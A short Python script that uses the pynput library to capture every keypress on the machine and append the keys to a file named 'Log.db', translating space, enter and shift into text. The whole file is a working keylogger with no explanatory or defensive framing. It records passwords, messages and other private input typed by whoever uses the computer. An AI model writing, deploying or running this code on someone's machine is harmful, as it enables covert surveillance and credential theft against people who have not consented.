from pynput.keyboard import Listener

def log_pressed_key(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift':
        key = ''

    with open("Log.db", 'a') as f:
        f.write(key)

with Listener(on_press=log_pressed_key) as l:
    l.join()